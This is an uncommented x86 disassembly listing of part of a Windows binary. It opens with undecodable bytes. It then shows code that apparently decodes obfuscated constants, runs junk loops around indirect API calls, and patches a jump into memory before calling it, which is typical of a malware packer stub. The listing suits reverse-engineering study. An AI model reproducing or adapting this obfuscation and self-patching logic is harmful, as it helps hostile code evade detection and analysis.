  40e610:	mov    edi,fs
  40e612:	jg     0x40e5d6
  40e614:	in     ax,dx
  40e616:	push   ebp
  40e617:	xchg   ecx,eax
  40e618:	inc    esi
  40e619:	mov    edx,0x49dc060f
  40e61e:	mov    bh,0x1b
  40e620:	mov    al,0x55
  40e622:	inc    ecx
  40e623:	pop    ebp
  40e624:	(bad)  
  40e625:	cmp    ch,dl
  40e627:	cmp    BYTE PTR [edi+0xc],bl
  40e62a:	shr    DWORD PTR [ecx],0x2f
  40e62d:	pop    ecx
  40e62e:	dec    eax
  40e62f:	mov    ah,0xc1
  40e631:	pop    eax
  40e632:	rcl    BYTE PTR gs:[ebp+0x3ca80031],cl
  40e639:	jmp    0x741:0x6b5831db
  40e640:	sub    BYTE PTR [esi+eiz*2],ah
  40e643:	(bad)  
  40e644:	mov    eax,0x4b9fb6db
  40e649:	loopne 0x40e683
  40e64b:	or     ebx,DWORD PTR [ebp+0x2f6250b0]
  40e651:	imul   esp,ebp,0xffffffa0
  40e654:	or     ebx,ebx
  40e656:	cmp    al,0x4d
  40e658:	in     eax,0xf8
  40e65a:	mov    ecx,0x331a506
  40e65f:	hlt    
  40e660:	ins    DWORD PTR es:[edi],dx
  40e661:	xchg   BYTE PTR [esi],ch
  40e663:	in     eax,0xad
  40e665:	call   0x71a107c5
  40e66a:	test   BYTE PTR [esi+ebx*1-0x7a],al
  40e66e:	ins    DWORD PTR es:[edi],dx
  40e66f:	mov    ebx,DWORD PTR [ecx]
  40e671:	cmp    dh,dl
  40e673:	add    dl,BYTE PTR [edi]
  40e675:	or     eax,0x3b78ac8c
  40e67a:	jnp    0x40e65e
  40e67c:	xchg   edi,eax
  40e67d:	mov    dl,0x8e
  40e67f:	push   esp
  40e680:	fwait
  40e681:	ds ror dl,0x27
  40e685:	push   ecx
  40e686:	mov    al,ds:0xced801c0
  40e68b:	xor    al,0xcc
  40e68d:	cli    
  40e68e:	push   esi
  40e68f:	push   esp
  40e690:	xchg   esp,eax
  40e691:	loop   0x40e61d
  40e693:	(bad)  
  40e694:	xor    BYTE PTR [edi+0x656abd5c],cl
  40e69a:	mov    dl,0x22
  40e69c:	out    0xc6,eax
  40e69e:	dec    ebx
  40e69f:	sbb    esp,ebp
  40e6a1:	shr    BYTE PTR [edi+0x2c61eb69],cl
  40e6a7:	mov    al,ds:0x8b896bb5
  40e6ac:	mov    ah,0x29
  40e6ae:	mov    edx,0xa42468a7
  40e6b3:	xor    BYTE PTR [eax+0x532025c4],dh
  40e6b9:	lea    edi,[eax+0x30976b70]
  40e6bf:	repnz in al,0xac
  40e6c2:	push   esp
  40e6c3:	leave  
  40e6c4:	cld    
  40e6c5:	(bad)  
  40e6c6:	into   
  40e6c7:	pop    eax
  40e6c8:	adc    eax,0x8c2c95f
  40e6cd:	add    BYTE PTR [ebp-0x75],dl
  40e6d0:	in     al,dx
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434713,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x4346c3,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x434647
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x43463b,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434603,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x434637,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x4346c7,0x4345df
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x4345eb,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x43463b,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x4346d3,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x4346d3
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x4346d3,edi
  40e76a:	cmp    DWORD PTR ds:0x4346d3,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x4346d3,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x4345eb
  40e789:	push   0x6202
  40e78e:	push   0x434788
  40e793:	push   0x434871
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x4346d3,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x4346d3
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x4346d3,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x43467b,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x43467b
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x43467b,edi
  40e7d9:	cmp    DWORD PTR ds:0x43467b,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x43467b,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43491f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x43463b,0x17
  40e815:	cmp    DWORD PTR ds:0x43463b,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x43463b,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x43463b
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x43463b,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43468b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x4346bf,0x434607
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x4345f3
  40e870:	and    ecx,DWORD PTR ds:0x4346cf
  40e876:	mov    DWORD PTR ds:0x4345f3,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x434647,0x13
  40e889:	cmp    DWORD PTR ds:0x434647,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x434647,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
  40e8b6:	cmp    DWORD PTR ds:0x434647,0x4
  40e8bd:	jne    0x40e8d0
  40e8c3:	mov    esi,DWORD PTR ds:0x434647
  40e8c9:	dec    esi
  40e8ca:	mov    DWORD PTR ds:0x434647,esi
  40e8d0:	xor    esi,esi
  40e8d2:	add    esi,DWORD PTR ds:0x434647
  40e8d8:	dec    esi
  40e8d9:	mov    DWORD PTR ds:0x434647,esi
  40e8df:	jmp    0x40e889
  40e8e4:	and    DWORD PTR ds:0x43467b,0x0
  40e8ee:	jmp    0x40e900
  40e8f3:	mov    edi,DWORD PTR ds:0x43467b
  40e8f9:	inc    edi
  40e8fa:	mov    DWORD PTR ds:0x43467b,edi
  40e900:	cmp    DWORD PTR ds:0x43467b,0x19
  40e907:	jae    0x40e94f
  40e90d:	cmp    DWORD PTR ds:0x43467b,0xd
  40e914:	jne    0x40e92a
  40e91a:	push   0x6845
  40e91f:	push   0x4347f3
  40e924:	call   DWORD PTR ds:0x41334c
  40e92a:	cmp    DWORD PTR ds:0x43467b,0xc
  40e931:	jne    0x40e944
  40e937:	mov    edi,DWORD PTR ds:0x43467b
  40e93d:	inc    edi
  40e93e:	mov    DWORD PTR ds:0x43467b,edi
  40e944:	jmp    0x40e8f3
  40e949:	sub    DWORD PTR ds:0x43463f,edi
  40e94f:	lea    eax,[ebp-0x30]
  40e952:	mov    ecx,DWORD PTR ds:0x434687
  40e958:	adc    DWORD PTR ds:0x4346b7,ecx
  40e95e:	mov    DWORD PTR [ebp-0x14],eax
  40e961:	mov    esi,DWORD PTR ds:0x43461b
  40e967:	xor    ecx,ecx
  40e969:	or     ecx,DWORD PTR ds:0x434657
  40e96f:	sub    esi,ecx
  40e971:	or     esi,DWORD PTR [esi+ecx*1]
  40e974:	mov    eax,ds:0x414afe
  40e979:	mov    ebx,DWORD PTR ds:0x4346b3
  40e97f:	mov    ebx,DWORD PTR [ebx]
  40e981:	sub    DWORD PTR ds:0x4345ff,ebx
  40e987:	mov    eax,DWORD PTR [eax+0x1c8]
  40e98d:	mov    eax,DWORD PTR [eax]
  40e98f:	or     edi,0x2360
  40e995:	mov    ecx,DWORD PTR [ebp-0x14]
  40e998:	mov    esi,0x7510851
  40e99d:	and    DWORD PTR ds:0x434647,0x6472
  40e9a7:	xor    eax,esi
  40e9a9:	sbb    edi,DWORD PTR ds:0x4345fb
  40e9af:	mov    edi,0x327299
  40e9b4:	xor    DWORD PTR ds:0x4345fb,ebx
  40e9ba:	add    eax,edi
  40e9bc:	mov    DWORD PTR [ecx],eax
  40e9be:	mov    eax,ds:0x414dae
  40e9c3:	movzx  ebx,WORD PTR ds:0x4346f7
  40e9ca:	cmp    eax,0x22c02f45
  40e9cf:	mov    eax,DWORD PTR [ebp-0x4]
  40e9d2:	movzx  ebx,BYTE PTR ds:0x4346c7
  40e9d9:	mov    ebx,0xf89c853a
  40e9de:	je     0x40ea1a
  40e9e4:	sub    DWORD PTR ds:0x4346ff,edi
  40e9ea:	mov    ecx,DWORD PTR [ebp-0x24]
  40e9ed:	xor    eax,esi
  40e9ef:	add    eax,edi
  40e9f1:	sbb    DWORD PTR ds:0x434703,0x3fff
  40e9fb:	imul   eax,ecx
  40e9fe:	mov    DWORD PTR ds:0x4345f7,0x22e4
  40ea08:	mov    DWORD PTR [ebp-0x24],eax
  40ea0b:	mov    DWORD PTR ds:0x434647,0x3208
  40ea15:	jmp    0x40eab6
  40ea1a:	add    DWORD PTR ds:0x4346bf,0x154a
  40ea24:	xor    eax,esi
  40ea26:	sbb    DWORD PTR ds:0x434647,0x7bc1
  40ea30:	add    eax,edi
  40ea32:	mov    ds:0x414c12,eax
  40ea37:	movzx  eax,BYTE PTR ds:0x4346bb
  40ea3e:	sub    DWORD PTR ds:0x4346bf,eax
  40ea44:	mov    eax,DWORD PTR [ebp-0x24]
  40ea47:	xor    eax,esi
  40ea49:	adc    DWORD PTR ds:0x43468f,ebx
  40ea4f:	add    eax,edi
  40ea51:	not    ecx
  40ea53:	mov    ds:0x414dae,eax
  40ea58:	mov    eax,DWORD PTR [ebp-0x4]
  40ea5b:	mov    ecx,DWORD PTR ds:0x414c12
  40ea61:	xor    eax,esi
  40ea63:	xor    DWORD PTR ds:0x434603,0x4346c3
  40ea6d:	add    eax,edi
  40ea6f:	mov    DWORD PTR ds:0x43468b,0x4a46
  40ea79:	cmp    ecx,eax
  40ea7b:	jne    0x40eab6
  40ea81:	sbb    DWORD PTR ds:0x434603,0x43464f
  40ea8b:	push   ebx
  40ea8c:	mov    DWORD PTR ds:0x4346bf,0x49e8
  40ea96:	push   DWORD PTR [ebp-0x4]
  40ea99:	sbb    DWORD PTR ds:0x43463f,0x7dd1
  40eaa3:	push   DWORD PTR [ebp-0x24]
  40eaa6:	adc    DWORD PTR ds:0x4345ef,0x434603
  40eab0:	call   DWORD PTR ds:0x414c0a
  40eab6:	and    edx,DWORD PTR ds:0x434603
  40eabc:	mov    eax,ds:0x414afe
  40eac1:	mov    ecx,DWORD PTR ds:0x434693
  40eac7:	and    DWORD PTR ds:0x434643,ecx
  40eacd:	mov    eax,DWORD PTR [eax+0x18c]
  40ead3:	sub    ecx,edx
  40ead5:	mov    eax,DWORD PTR [eax]
  40ead7:	neg    ecx
  40ead9:	mov    DWORD PTR [ebp-0x44],eax
  40eadc:	mov    DWORD PTR [ebp-0x10],ebx
  40eadf:	sub    ecx,DWORD PTR ds:0x43470f
  40eae5:	mov    DWORD PTR [ebp-0x10],ebx
  40eae8:	and    DWORD PTR ds:0x43463f,0x0
  40eaf2:	jmp    0x40eb04
  40eaf7:	mov    ecx,DWORD PTR ds:0x43463f
  40eafd:	inc    ecx
  40eafe:	mov    DWORD PTR ds:0x43463f,ecx
  40eb04:	cmp    DWORD PTR ds:0x43463f,0x1d
  40eb0b:	jae    0x40eb61
  40eb11:	cmp    DWORD PTR ds:0x43463f,0x7
  40eb18:	jne    0x40eb2c
  40eb1e:	push   DWORD PTR [ebp-0x18]
  40eb21:	push   0x7577
  40eb26:	call   DWORD PTR ds:0x4130d0
  40eb2c:	cmp    DWORD PTR ds:0x43463f,0x6
  40eb33:	jne    0x40eb48
  40eb39:	xor    ecx,ecx
  40eb3b:	add    ecx,DWORD PTR ds:0x43463f
  40eb41:	inc    ecx
  40eb42:	mov    DWORD PTR ds:0x43463f,ecx
  40eb48:	jmp    0x40eaf7
  40eb4d:	xor    edx,edx
  40eb4f:	or     edx,DWORD PTR ds:0x434647
  40eb55:	sbb    edx,DWORD PTR ds:0x434707
  40eb5b:	mov    DWORD PTR ds:0x434647,edx
  40eb61:	mov    DWORD PTR [ebp-0x10],ebx
  40eb64:	mov    ecx,DWORD PTR ds:0x43470b
  40eb6a:	or     DWORD PTR ds:0x4346bb,ecx
  40eb70:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  40eb77:	or     eax,edx
  40eb79:	mov    DWORD PTR [ebp-0x10],ebx
  40eb7c:	mov    DWORD PTR [ebp-0x10],0xf89c853e
  40eb83:	xor    ecx,DWORD PTR ds:0x434637
  40eb89:	mov    eax,DWORD PTR [ebp-0x24]
  40eb8c:	and    edx,0x522c
  40eb92:	mov    ecx,DWORD PTR [ebp-0x4]
  40eb95:	and    DWORD PTR ds:0x43470f,edx
  40eb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40eb9e:	or     DWORD PTR ds:0x43470b,0x4346c7
  40eba8:	xor    edx,esi
  40ebaa:	sub    DWORD PTR ds:0x43464f,0x434607
  40ebb4:	xor    ecx,esi
  40ebb6:	adc    DWORD PTR ds:0x4346bf,0x4346fb
  40ebc0:	add    ecx,edx
  40ebc2:	mov    edx,DWORD PTR [ebp-0x4]
  40ebc5:	adc    DWORD PTR ds:0x4345f7,0x434677
  40ebcf:	xor    eax,esi
  40ebd1:	xor    edx,esi
  40ebd3:	adc    DWORD PTR ds:0x4345e3,0x6faf
  40ebdd:	add    eax,edi
  40ebdf:	mov    DWORD PTR ds:0x434683,0x13
  40ebe9:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ebf0:	mov    DWORD PTR ds:0x43463b,0x74ca
  40ebfa:	mov    DWORD PTR [ebp-0x20],eax
  40ebfd:	mov    DWORD PTR ds:0x434643,0x777a
  40ec07:	cmp    eax,ecx
  40ec09:	mov    DWORD PTR ds:0x434713,0x6f86
  40ec13:	ja     0x40ed7b
  40ec19:	jmp    0x40ec27
  40ec1e:	adc    DWORD PTR ds:0x43467b,edi
  40ec24:	mov    eax,DWORD PTR [ebp-0x20]
  40ec27:	add    DWORD PTR ds:0x434703,0x32bd
  40ec31:	mov    ecx,DWORD PTR [ebp-0x4]
  40ec34:	xor    ecx,esi
  40ec36:	xor    DWORD PTR ds:0x4345e7,0x43468f
  40ec40:	lea    eax,[ecx+eax*1+0x327299]
  40ec47:	push   eax
  40ec48:	and    DWORD PTR ds:0x434693,0x0
  40ec52:	xor    eax,eax
  40ec54:	or     eax,DWORD PTR ds:0x434693
  40ec5a:	inc    eax
  40ec5b:	mov    ds:0x434693,eax
  40ec60:	cmp    DWORD PTR ds:0x434693,0x10
  40ec67:	jne    0x40ec76
  40ec6d:	push   DWORD PTR [ebp-0x1c]
  40ec70:	call   DWORD PTR ds:0x413350
  40ec76:	cmp    DWORD PTR ds:0x434693,0xf
  40ec7d:	jne    0x40ec91
  40ec83:	xor    eax,eax
  40ec85:	add    eax,DWORD PTR ds:0x434693
  40ec8b:	inc    eax
  40ec8c:	mov    ds:0x434693,eax
  40ec91:	cmp    DWORD PTR ds:0x434693,0x1c
  40ec98:	jb     0x40ec52
  40ec9e:	movzx  eax,BYTE PTR ds:0x4345e3
  40eca5:	adc    eax,DWORD PTR ds:0x43467b
  40ecab:	mov    ds:0x4345e3,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x14]
  40ecb3:	xor    eax,esi
  40ecb5:	mov    DWORD PTR ds:0x43463f,0x3b17
  40ecbf:	lea    eax,[ebp+eax*1+0x3272a1]
  40ecc6:	sub    DWORD PTR ds:0x4346f7,0x434603
  40ecd0:	push   eax
  40ecd1:	and    eax,DWORD PTR ds:0x43467b
  40ecd7:	mov    eax,ds:0x414afe
  40ecdc:	adc    DWORD PTR ds:0x434637,0x7c2
  40ece6:	push   DWORD PTR [eax+0x1bc]
  40ecec:	call   0x4028d7
  40ecf1:	mov    eax,DWORD PTR [ebp-0x4]
  40ecf4:	mov    ecx,DWORD PTR [ebp-0x20]
  40ecf7:	mov    edx,DWORD PTR ds:0x4346fb
  40ecfd:	or     DWORD PTR ds:0x434713,edx
  40ed03:	xor    eax,esi
  40ed05:	lea    eax,[ecx+eax*1+0x327299]
  40ed0c:	mov    ecx,DWORD PTR [ebp-0x4]
  40ed0f:	or     DWORD PTR ds:0x434643,edi
  40ed15:	mov    edx,DWORD PTR [ebp-0x4]
  40ed18:	sub    DWORD PTR ds:0x434677,0x283f
  40ed22:	xor    edx,esi
  40ed24:	xor    DWORD PTR ds:0x4346d3,0x434637
  40ed2e:	xor    ecx,esi
  40ed30:	add    ecx,edx
  40ed32:	mov    edx,DWORD PTR [ebp-0x4]
  40ed35:	and    DWORD PTR ds:0x4346f7,0x4345ff
  40ed3f:	xor    edx,esi
  40ed41:	mov    DWORD PTR ds:0x434637,0x5401
  40ed4b:	lea    ecx,[ecx+edx*1+0x9757cb]
  40ed52:	mov    DWORD PTR ds:0x434607,0x25c8
  40ed5c:	mov    DWORD PTR [ebp-0x20],eax
  40ed5f:	mov    DWORD PTR ds:0x43463f,0x56d4
  40ed69:	cmp    eax,ecx
  40ed6b:	mov    DWORD PTR ds:0x434607,0x74b6
  40ed75:	jbe    0x40ec1e
  40ed7b:	mov    DWORD PTR ds:0x4346ff,0x4be2
  40ed85:	mov    eax,DWORD PTR [ebp+0xc]
  40ed88:	add    DWORD PTR ds:0x434707,edx
  40ed8e:	mov    ds:0x414982,eax
  40ed93:	mov    eax,DWORD PTR [ebp+0x10]
  40ed96:	mov    ds:0x414bd6,eax
  40ed9b:	and    DWORD PTR ds:0x4346c7,0x0
  40eda5:	mov    ecx,DWORD PTR ds:0x4346c7
  40edab:	inc    ecx
  40edac:	mov    DWORD PTR ds:0x4346c7,ecx
  40edb2:	cmp    DWORD PTR ds:0x4346c7,0x1f
  40edb9:	jne    0x40edca
  40edbf:	push   0x43495b
  40edc4:	call   DWORD PTR ds:0x413354
  40edca:	cmp    DWORD PTR ds:0x4346c7,0x13
  40edd1:	jb     0x40eda5
  40edd7:	add    ecx,eax
  40edd9:	mov    eax,ds:0x414982
  40edde:	inc    ecx
  40eddf:	mov    ecx,DWORD PTR [ebp-0x18]
  40ede2:	sub    DWORD PTR ds:0x43464f,0x1b10
  40edec:	push   DWORD PTR [ebp-0x44]
  40edef:	or     DWORD PTR ds:0x4346c3,0x4346f7
  40edf9:	sub    eax,edi
  40edfb:	sub    DWORD PTR ds:0x4345ff,0x4345ef
  40ee05:	push   DWORD PTR [ebp-0x30]
  40ee08:	adc    DWORD PTR ds:0x43463b,0x5064
  40ee12:	xor    eax,esi
  40ee14:	mov    DWORD PTR [ecx],eax
  40ee16:	push   DWORD PTR [ebp-0x2c]
  40ee19:	call   0x40f157
  40ee1e:	sub    eax,edi
  40ee20:	adc    ecx,DWORD PTR ds:0x4345ef
  40ee26:	xor    eax,esi
  40ee28:	mov    DWORD PTR ds:0x4345ff,0x13
  40ee32:	cmp    DWORD PTR ds:0x4345ff,0x0
  40ee39:	je     0x40ee7a
  40ee3f:	cmp    DWORD PTR ds:0x4345ff,0x18
  40ee46:	jne    0x40ee68
  40ee4c:	push   0x43495b
  40ee51:	push   DWORD PTR [ebp-0xc]
  40ee54:	push   DWORD PTR [ebp-0x28]
  40ee57:	push   DWORD PTR [ebp-0x1c]
  40ee5a:	push   DWORD PTR [ebp-0x20]
  40ee5d:	push   0x2408
  40ee62:	call   DWORD PTR ds:0x413358
  40ee68:	mov    ecx,DWORD PTR ds:0x4345ff
  40ee6e:	dec    ecx
  40ee6f:	mov    DWORD PTR ds:0x4345ff,ecx
  40ee75:	jmp    0x40ee32
  40ee7a:	mov    DWORD PTR [ebp+0xc],eax
  40ee7d:	mov    ecx,DWORD PTR [ebp-0x4]
  40ee80:	mov    eax,DWORD PTR [ebp+0xc]
  40ee83:	xor    ecx,esi
  40ee85:	add    ecx,edi
  40ee87:	xor    edx,edx
  40ee89:	div    ecx
  40ee8b:	mov    ecx,DWORD PTR [ebp-0x24]
  40ee8e:	cmp    ecx,eax
  40ee90:	jne    0x40f0b9
  40ee96:	mov    eax,ds:0x414afe
  40ee9b:	mov    DWORD PTR [ebp+0x10],eax
  40ee9e:	mov    eax,ds:0x414c0e
  40eea3:	mov    DWORD PTR [ebp-0x50],eax
  40eea6:	mov    DWORD PTR [ebp-0x18],0xf89c8536
  40eead:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40eeb4:	mov    DWORD PTR [ebp-0x4c],0xf89cb536
  40eebb:	mov    DWORD PTR [ebp-0x64],0xf89f0536
  40eec2:	mov    DWORD PTR [ebp-0x60],0xf89c85f6
  40eec9:	mov    DWORD PTR [ebp-0x54],0xf89c85d6
  40eed0:	mov    eax,DWORD PTR [ebp-0x18]
  40eed3:	xor    eax,esi
  40eed5:	add    eax,edi
  40eed7:	mov    DWORD PTR [ebp-0xc],eax
  40eeda:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  40eee1:	mov    BYTE PTR [ebp-0x25],0x67
  40eee5:	mov    eax,DWORD PTR [ebp-0x18]
  40eee8:	xor    eax,esi
  40eeea:	add    eax,edi
  40eeec:	mov    DWORD PTR [ebp-0xc],eax
  40eeef:	mov    eax,DWORD PTR [ebp-0x54]
  40eef2:	xor    eax,esi
  40eef4:	add    eax,edi
  40eef6:	mov    DWORD PTR [ebp-0x40],eax
  40eef9:	mov    eax,DWORD PTR [ebp-0x4c]
  40eefc:	xor    eax,esi
  40eefe:	add    eax,edi
  40ef00:	mov    DWORD PTR [ebp-0x38],eax
  40ef03:	mov    eax,DWORD PTR [ebp-0x3c]
  40ef06:	xor    eax,esi
  40ef08:	add    eax,edi
  40ef0a:	mov    DWORD PTR [ebp-0x34],eax
  40ef0d:	lea    eax,[ebp-0xa8]
  40ef13:	mov    DWORD PTR [ebp+0xc],eax
  40ef16:	mov    eax,DWORD PTR [ebp-0x18]
  40ef19:	mov    DWORD PTR [ebp-0x14],eax
  40ef1c:	mov    eax,DWORD PTR [ebp-0x20]
  40ef1f:	mov    DWORD PTR [ebp-0x5c],ebx
  40ef22:	mov    DWORD PTR [ebp-0x10],eax
  40ef25:	mov    eax,DWORD PTR [ebp-0x5c]
  40ef28:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef2b:	xor    eax,esi
  40ef2d:	add    eax,0x327299
  40ef32:	mov    DWORD PTR [ecx],eax
  40ef34:	mov    eax,DWORD PTR [ebp-0x14]
  40ef37:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef3a:	xor    eax,esi
  40ef3c:	add    eax,edi
  40ef3e:	mov    DWORD PTR [ecx+0x4],eax
  40ef41:	mov    eax,DWORD PTR [ebp-0x34]
  40ef44:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef47:	mov    DWORD PTR [ecx+0x8],eax
  40ef4a:	mov    eax,DWORD PTR [ebp-0x38]
  40ef4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef50:	mov    DWORD PTR [ecx+0xc],eax
  40ef53:	mov    eax,DWORD PTR [ebp-0x40]
  40ef56:	mov    ecx,DWORD PTR [ebp+0xc]
  40ef59:	mov    DWORD PTR [ecx+0x10],eax
  40ef5c:	mov    eax,eax
  40ef5e:	mov    eax,DWORD PTR [ebp-0x10]
  40ef61:	xor    eax,esi
  40ef63:	add    eax,edi
  40ef65:	je     0x40ef96
  40ef6b:	lea    eax,[ebp-0xa8]
  40ef71:	push   eax
  40ef72:	mov    eax,DWORD PTR [ebp-0x20]
  40ef75:	xor    eax,esi
  40ef77:	add    eax,edi
  40ef79:	push   eax
  40ef7a:	mov    eax,DWORD PTR [ebp+0x10]
  40ef7d:	add    eax,0xaa
  40ef82:	push   eax
  40ef83:	mov    eax,DWORD PTR [ebp+0x10]
  40ef86:	mov    eax,DWORD PTR [eax+0x198]
  40ef8c:	push   DWORD PTR [eax]
  40ef8e:	call   0x411333
  40ef93:	mov    DWORD PTR [ebp-0x8],eax
  40ef96:	cmp    DWORD PTR [ebp-0x8],0x0
  40ef9a:	je     0x40f0b9
  40efa0:	lea    eax,[ebp-0xc]
  40efa3:	mov    DWORD PTR [ebp-0x38],eax
  40efa6:	mov    eax,DWORD PTR [ebp-0x60]
  40efa9:	xor    eax,esi
  40efab:	add    eax,edi
  40efad:	mov    DWORD PTR [ebp-0x40],eax
  40efb0:	mov    eax,DWORD PTR [ebp-0x3c]
  40efb3:	xor    eax,esi
  40efb5:	add    eax,edi
  40efb7:	mov    DWORD PTR [ebp-0x10],eax
  40efba:	mov    eax,DWORD PTR [ebp-0x8]
  40efbd:	mov    DWORD PTR [ebp-0x14],eax
  40efc0:	lea    eax,[ebp-0xa8]
  40efc6:	mov    DWORD PTR [ebp+0xc],eax
  40efc9:	mov    eax,DWORD PTR [ebp-0x18]
  40efcc:	mov    DWORD PTR [ebp-0x18],eax
  40efcf:	mov    eax,DWORD PTR [ebp-0x20]
  40efd2:	mov    DWORD PTR [ebp-0x48],ebx
  40efd5:	mov    DWORD PTR [ebp-0x34],eax
  40efd8:	mov    eax,DWORD PTR [ebp-0x48]
  40efdb:	mov    ecx,DWORD PTR [ebp+0xc]
  40efde:	xor    eax,esi
  40efe0:	add    eax,0x327299
  40efe5:	mov    DWORD PTR [ecx],eax
  40efe7:	mov    eax,DWORD PTR [ebp-0x14]
  40efea:	mov    ecx,DWORD PTR [ebp+0xc]
  40efed:	mov    DWORD PTR [ecx+0x4],eax
  40eff0:	mov    eax,DWORD PTR [ebp-0x10]
  40eff3:	mov    ecx,DWORD PTR [ebp+0xc]
  40eff6:	mov    DWORD PTR [ecx+0x8],eax
  40eff9:	mov    eax,DWORD PTR [ebp-0x40]
  40effc:	mov    ecx,DWORD PTR [ebp+0xc]
  40efff:	mov    DWORD PTR [ecx+0xc],eax
  40f002:	mov    eax,DWORD PTR [ebp-0x38]
  40f005:	mov    ecx,DWORD PTR [ebp+0xc]
  40f008:	mov    DWORD PTR [ecx+0x10],eax
  40f00b:	mov    eax,eax
  40f00d:	mov    eax,DWORD PTR [ebp-0x14]
  40f010:	test   eax,eax
  40f012:	mov    eax,DWORD PTR [ebp-0x34]
  40f015:	jne    0x40f01e
  40f01b:	mov    eax,DWORD PTR [ebp-0x18]
  40f01e:	xor    eax,esi
  40f020:	add    eax,edi
  40f022:	test   eax,eax
  40f024:	je     0x40f052
  40f02a:	lea    eax,[ebp-0xa8]
  40f030:	push   eax
  40f031:	mov    eax,DWORD PTR [ebp-0x20]
  40f034:	xor    eax,esi
  40f036:	add    eax,edi
  40f038:	push   eax
  40f039:	mov    eax,DWORD PTR [ebp+0x10]
  40f03c:	add    eax,0xee
  40f041:	push   eax
  40f042:	mov    eax,DWORD PTR [ebp+0x10]
  40f045:	mov    eax,DWORD PTR [eax+0x198]
  40f04b:	push   DWORD PTR [eax]
  40f04d:	call   0x411333
  40f052:	mov    ecx,DWORD PTR [ebp-0x3c]
  40f055:	xor    ecx,esi
  40f057:	mov    eax,0xffcd8d67
  40f05c:	sub    eax,ecx
  40f05e:	sub    eax,DWORD PTR [ebp-0x8]
  40f061:	mov    ecx,DWORD PTR [ebp-0x50]
  40f064:	add    ecx,eax
  40f066:	mov    eax,DWORD PTR [ebp-0x8]
  40f069:	mov    DWORD PTR [eax+0x1],ecx
  40f06c:	mov    al,BYTE PTR [ebp-0x25]
  40f06f:	mov    ecx,DWORD PTR [ebp-0x8]
  40f072:	xor    al,0x44
  40f074:	sub    al,0x3a
  40f076:	mov    BYTE PTR [ecx],al
  40f078:	lea    eax,[ebp-0x8]
  40f07b:	inc    BYTE PTR [eax]
  40f07d:	inc    eax
  40f07e:	push   eax
  40f07f:	pop    ecx
  40f080:	dec    ecx
  40f081:	xchg   ecx,edx
  40f083:	dec    BYTE PTR [edx]
  40f085:	push   DWORD PTR [ebp+0x10]
  40f088:	mov    eax,ds:0x414bba
  40f08d:	mov    eax,DWORD PTR [eax]
  40f08f:	push   DWORD PTR [eax]
  40f091:	lea    eax,ds:0x414bd6
  40f097:	push   DWORD PTR [eax]
  40f099:	lea    eax,ds:0x414982
  40f09f:	push   DWORD PTR [eax]
  40f0a1:	lea    eax,ds:0x414bb6
  40f0a7:	push   DWORD PTR [eax]
  40f0a9:	lea    eax,ds:0x414cda
  40f0af:	push   DWORD PTR [eax]
  40f0b1:	xchg   ebx,edx
  40f0b3:	inc    ebx
  40f0b4:	push   ebx
  40f0b5:	pop    eax
  40f0b6:	call   DWORD PTR [eax-0x1]
  40f0b9:	lea    eax,[ebp+0x4]
  40f0bc:	mov    DWORD PTR [ebp-0x58],eax
